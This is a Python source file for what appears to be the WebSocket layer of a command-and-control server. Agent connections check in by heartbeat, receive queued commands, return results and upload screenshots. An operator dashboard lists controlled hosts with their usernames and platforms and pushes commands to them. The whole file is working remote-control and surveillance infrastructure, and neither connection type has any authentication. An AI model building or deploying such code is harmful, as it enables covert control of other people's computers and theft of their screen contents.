"""
C2 Core App - WebSocket Consumers
Django Channels for real-time communication
Handles 10,000+ concurrent WebSocket connections
"""

import json
from channels.generic.websocket import AsyncWebsocketConsumer
from channels.db import database_sync_to_async
from django.utils import timezone


class AgentConsumer(AsyncWebsocketConsumer):
    """
    WebSocket consumer for real-time agent communication
    Replaces Flask-SocketIO
    """
    
    async def connect(self):
        """Handle WebSocket connection"""
        self.agent_id = self.scope['url_route']['kwargs']['agent_id']
        self.room_group_name = f'agent_{self.agent_id}'
        
        # Join room group
        await self.channel_layer.group_add(
            self.room_group_name,
            self.channel_name
        )
        
        await self.accept()
        
        # Send welcome message
        await self.send(text_data=json.dumps({
            'type': 'connection',
            'message': 'Connected to C2 server',
            'timestamp': timezone.now().isoformat()
        }))
    
    async def disconnect(self, close_code):
        """Handle WebSocket disconnection"""
        # Leave room group
        await self.channel_layer.group_discard(
            self.room_group_name,
            self.channel_name
        )
        
        # Mark agent as offline
        await self.mark_agent_offline()
    
    async def receive(self, text_data):
        """
        Receive message from WebSocket
        Handles: heartbeat, command_result, etc.
        """
        try:
            data = json.loads(text_data)
            message_type = data.get('type')
            
            if message_type == 'heartbeat':
                await self.handle_heartbeat(data)
            elif message_type == 'command_result':
                await self.handle_command_result(data)
            elif message_type == 'screenshot':
                await self.handle_screenshot(data)
            else:
                await self.send(text_data=json.dumps({
                    'error': 'Unknown message type'
                }))
                
        except json.JSONDecodeError:
            await self.send(text_data=json.dumps({
                'error': 'Invalid JSON'
            }))
    
    async def handle_heartbeat(self, data):
        """Process heartbeat message"""
        # Update agent last_seen (async)
        await self.update_agent_last_seen()
        
        # Get pending commands
        commands = await self.get_pending_commands()
        
        # Send commands to agent
        await self.send(text_data=json.dumps({
            'type': 'commands',
            'commands': commands,
            'timestamp': timezone.now().isoformat()
        }))
    
    async def handle_command_result(self, data):
        """Process command execution result"""
        command_id = data.get('command_id')
        result = data.get('result')
        
        # Save result to database
        await self.save_command_result(command_id, result)
        
        # Broadcast to operators
        await self.channel_layer.group_send(
            f'operators',
            {
                'type': 'command_result',
                'agent_id': self.agent_id,
                'command_id': command_id,
                'result': result
            }
        )
    
    async def handle_screenshot(self, data):
        """Handle screenshot data"""
        screenshot_data = data.get('data')
        
        # Save screenshot (async task)
        from c2_commands.tasks import save_screenshot_async
        save_screenshot_async.delay(self.agent_id, screenshot_data)
        
        await self.send(text_data=json.dumps({
            'type': 'ack',
            'message': 'Screenshot received'
        }))
    
    # Database operations (async wrappers)
    
    @database_sync_to_async
    def update_agent_last_seen(self):
        """Update agent last_seen timestamp"""
        from c2_agents.models import Agent
        Agent.objects.filter(id=self.agent_id).update(
            last_seen=timezone.now(),
            status='active'
        )
    
    @database_sync_to_async
    def mark_agent_offline(self):
        """Mark agent as offline"""
        from c2_agents.models import Agent
        Agent.objects.filter(id=self.agent_id).update(
            status='offline'
        )
    
    @database_sync_to_async
    def get_pending_commands(self):
        """Get pending commands for agent"""
        from c2_commands.models import Command
        commands = Command.objects.filter(
            agent_id=self.agent_id,
            status='pending'
        )[:100]
        
        return [
            {
                'id': str(cmd.id),
                'type': cmd.command_type,
                'data': cmd.command_data
            }
            for cmd in commands
        ]
    
    @database_sync_to_async
    def save_command_result(self, command_id, result):
        """Save command execution result"""
        from c2_commands.models import Command
        Command.objects.filter(id=command_id).update(
            status='completed',
            result=result,
            completed_at=timezone.now()
        )
    
    # Group message handlers
    
    async def send_command(self, event):
        """Send command to agent (from group)"""
        await self.send(text_data=json.dumps({
            'type': 'command',
            'command': event['command']
        }))


class OperatorConsumer(AsyncWebsocketConsumer):
    """
    WebSocket consumer for C2 operators
    Real-time dashboard updates
    """
    
    async def connect(self):
        """Connect operator to dashboard"""
        self.room_group_name = 'operators'
        
        # Join operators group
        await self.channel_layer.group_add(
            self.room_group_name,
            self.channel_name
        )
        
        await self.accept()
        
        # Send initial data
        agents = await self.get_all_agents()
        await self.send(text_data=json.dumps({
            'type': 'initial_data',
            'agents': agents
        }))
    
    async def disconnect(self, close_code):
        """Disconnect operator"""
        await self.channel_layer.group_discard(
            self.room_group_name,
            self.channel_name
        )
    
    async def receive(self, text_data):
        """Receive message from operator"""
        data = json.loads(text_data)
        
        message_type = data.get('type')
        
        if message_type == 'send_command':
            await self.send_command_to_agent(data)
    
    async def send_command_to_agent(self, data):
        """Send command to specific agent"""
        agent_id = data.get('agent_id')
        command = data.get('command')
        
        # Create command in database
        await self.create_command(agent_id, command)
        
        # Send to agent via WebSocket
        await self.channel_layer.group_send(
            f'agent_{agent_id}',
            {
                'type': 'send_command',
                'command': command
            }
        )
    
    # Message handlers
    
    async def command_result(self, event):
        """Broadcast command result to operators"""
        await self.send(text_data=json.dumps({
            'type': 'command_result',
            'agent_id': event['agent_id'],
            'command_id': event['command_id'],
            'result': event['result']
        }))
    
    async def agent_update(self, event):
        """Broadcast agent status update"""
        await self.send(text_data=json.dumps({
            'type': 'agent_update',
            'agent': event['agent']
        }))
    
    # Database operations
    
    @database_sync_to_async
    def get_all_agents(self):
        """Get all active agents"""
        from c2_agents.models import Agent
        agents = Agent.objects.filter(status='active')[:1000]
        
        return [
            {
                'id': str(agent.id),
                'hostname': agent.hostname,
                'username': agent.username,
                'platform': agent.platform,
                'last_seen': agent.last_seen.isoformat()
            }
            for agent in agents
        ]
    
    @database_sync_to_async
    def create_command(self, agent_id, command):
        """Create command in database"""
        from c2_commands.models import Command
        return Command.objects.create(
            agent_id=agent_id,
            command_type=command.get('type'),
            command_data=command.get('data'),
            status='pending'
        )
